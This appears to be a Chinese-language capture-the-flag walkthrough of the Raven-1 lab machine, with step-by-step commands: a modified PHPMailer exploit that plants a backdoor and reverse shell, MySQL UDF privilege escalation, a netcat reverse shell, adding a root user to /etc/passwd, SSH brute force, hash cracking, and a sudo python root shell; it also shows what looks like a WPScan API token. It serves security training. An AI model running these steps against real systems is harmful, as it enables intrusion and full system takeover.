# mynew
改exp的时候注意事项
目标 具体url eg：本项目中要找到可以解析php的url，木马的名字<5字符
grep "password" -rn wp-config.php
udf提权 项目3. 6. 15
mysql udf nc反弹shell 创建root用户
sudo python提权


该项目Raven-1是在项目三做过作者的第二个项目的！

1、nmap 10.211.55.0/24 -sP
Nmap scan report for localhost (10.211.55.12)
发现项目IP地址！


2、全端口扫描nmap
nmap -sC -sV -A -T5 -p- 10.211.55.12
22/tcp    open  ssh     OpenSSH 6.7p1
80/tcp    open  http    Apache httpd 2.4.10
111/tcp   open  rpcbind 2-4 (RPC #100000)
54140/tcp open  status  1 (RPC #100024)


3、AWVS漏扫

http://10.211.55.12/
漏扫发现：
WordPress 4.8.x Multiple Vulnerabilities (4.8 - 4.8.15)


4、页面信息收集

1）在访问：http://10.211.55.12/service.html模块查看静态源码发现flag：
flag1{b9bbcb33e11b80be759c4e844862482d}


2）dirb http://10.211.55.12
枚举发现该目录：
==> DIRECTORY: http://10.211.55.12/vendor/

http://10.211.55.12/vendor/PATH  第二个目录获得flag：
/var/www/html/vendor/
flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}

3）http://10.211.55.12/vendor/README.md
枚举获得信息：PHPMailer
http://10.211.55.1N2/vendor/VERSIO
枚举获得信息：5.2.16
这时候去找EXP！


+5、PHPMailer

谷歌：PHPMailer 5.2.16 exp
CVE-2016-10033
点击第一条就能发现：https://www.exploit-db.com/exploits/40974

searchsploit 40974
cp /usr/share/exploitdb/exploits/php/webapps/40974.py /root/桌面

将exp考出，需要针对PHPMailer修改参数:

+41行：改下地址：http://10.211.55.12/contact.php
42行：后门名称：/dayu.php
44行：改下回弹的IP和端口  10.211.55.19  6666
47行：改下写入shell的目录：/var/www/html/dayu.php


6、执行exp
python3 40974.py
如果环境报错按照环境安装：
需要安装requests_toolbelt模块，使用命令：pip install requests-toolbelt安装即可，如果没用pip，需要sudo apt-get install python-pip安装即可。

访问http://10.211.55.12/contact.php，此时就会生成后门文件dayu.php
本地开启监听：nc -vlp 6666
访问：http://10.211.55.12/dayu.php
获得反弹shell！
python -c 'import pty;pty.spawn("/bin/bash")'


7、内网信息收集

1）在www目录下发现flag2
/var/www
flag2{fc3fd58dcdad9ab23faca6e9a36e581c}


2）wordpress目录枚举
在wordpress目录下发现wp-config.php：
grep "内容" -rn 
grep "password" -rn wp-config.php

define('DB_USER', 'root');
/** MySQL database password */
define('DB_PASSWORD', 'R@v3nSecurity');
获得mysql账号密码信息！


3）查看是否能udf提权
==条件1：查看是否是root权限运行
ps aux | grep root   ---查看mysql进程信息
条件2：查看mysql版本
dpkg -l | grep mysql   --查看历史安装包版本 5.5.6==

mysql是root权限运行的，那么接下来就找mysql提权的方法。
mysql -uroot -pR@v3nSecurity


8、mysql UDF 提权
UDF 提权、MOF 提权是非常经典的提权方法！
https://blog.csdn.net/qq_36119192/article/details/84863268
------------------

==首先看一下是否满足写入条件：条件1
show global variables like 'secure%';==
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_auth      | OFF   |
| secure_file_priv |       |
+------------------+-------+
2 rows in set (0.00 sec)
1）当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权
2）当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/目录下，此时也无法提权
3）当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权!
如果是 MySQL >= 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。

==查看插件目录：条件2
show variables like '%plugin%';==
+---------------+------------------------+
| Variable_name | Value                  |
+---------------+------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/ |
+---------------+------------------------+
1 row in set (0.00 sec)

==查看能否远程登陆：
use mysql;
select user,host from user;==
+------------------+-----------+
| user             | host      |
+------------------+-----------+
| root             | 127.0.0.1 |
| root             | ::1       |
| debian-sys-maint | localhost |
| root             | localhost |
| root             | raven     |
+------------------+-----------+
5 rows in set (0.00 sec)
发现这里root用户不允许远程登陆，因此不能利用MSF提权。




谷歌搜索：mysql 5.x UDF exploit  或者  searchsploit udf
https://www.exploit-db.com/exploits/1518   
searchsploit 1518.c
cp /usr/share/exploitdb/exploits/linux/local/1518.c /root/桌面 

gcc -g -c 1518.c   ---GCC编译.o文件
gcc -g -shared -o dayu.so 1518.o -lc
-g 生成调试信息
-c 编译（二进制）
-shared：创建一个动态链接库，输入文件可以是源文件、汇编文件或者目标文件。
-o：执行命令后的文件名
-lc：-l 库 c库名

wget http://192.168.139.131/zc1.so

show databases;
use mysql
select database();

进入数据库创建数据表dayu：
create table zc1(line blob);
插入数据文件：
insert into zc1 values(load_file('/var/www/html/zc.so'));

dayu表成功插入二进制数据，然后利用dumpfile函数把文件导出，outfile 多行导出，dumpfile一行导出
outfile会有特殊的转换，而dumpfile是原数据导出！
新建存储函数：
select * from zc1 into dumpfile '/usr/lib/mysql/plugin/zc1.so';

创建自定义函数do_system，类型是integer，别名（soname）文件名字，然后查询函数是否创建成功：
create function do_system returns integer soname 'zc1.so';

查看以下创建的函数：
select * from mysql.func;
调用do_system函数来给find命令所有者的suid权限，使其可以执行root命令：
select do_system('chmod u+s /usr/bin/find');

执行find命令
使用find执行 shell
touch dayu
find zc -exec "/bin/sh" \;
或者：find dayu -exec "id" \;
cd /root
cat flag4.txt
flag4{df2bc5e951d91581467bb9a2a8ff4425}


-------------------
UDF拓展知识点：

1）nc反弹shell：
select do_system('nc -nv 10.211.55.28 6677 -e /bin/bash');

-------------------
2）创建root权限用户
openssl passwd dayu1
YpIR51FecR9AY
select do_system('echo "dayu1:Ef8ipBmhp5pnE:0:0:root:/root:/bin/bash" >> /etc/passwd');
su dayu
                        root:x:0:0:root:/root:/bin/bash
-------------------


9、内网信息收集用户名爆破

1）脚本枚举用户：michael、steven
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 10.211.55.12 ssh
[22][ssh] host: 10.211.55.12   login: michael   password: michael

2）数据库枚举密码值爆破

数据库枚举发现信息：
mysql -uroot -pR@v3nSecurity 

show databases;
use wordpress
show tables;
select * from wp_users;
michael:$P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0
steven:$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/

john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt
pink84           (steven)

steven
pink84
ssh steven@10.211.55.12

sudo -l   
User steven may run the following commands on raven:
    ==(ALL) NOPASSWD: /usr/bin/python
发现是python给与的最高权限！
sudo python -c 'import pty; pty.spawn("/bin/bash")'
这时候用sudo执行python就能拿到root的shell!==



9、项目7 wpscan扫描

wpscan --url http://10.211.55.12/wordpress -eu
https://wpscan.com/register

wpscan --url http://10.211.55.12/wordpress -eu --api-token kJ4bhzc11gveCcoGJPER7AOsHJTeFDf90Wfj9zu0V6asc


--------
在数据库wordpress的wp_posts表中发现：
flag3{afc01ab56b50591e7dccf93122770cd2}
flag4{715dea6c055b9fe3337544932f2941ce}







































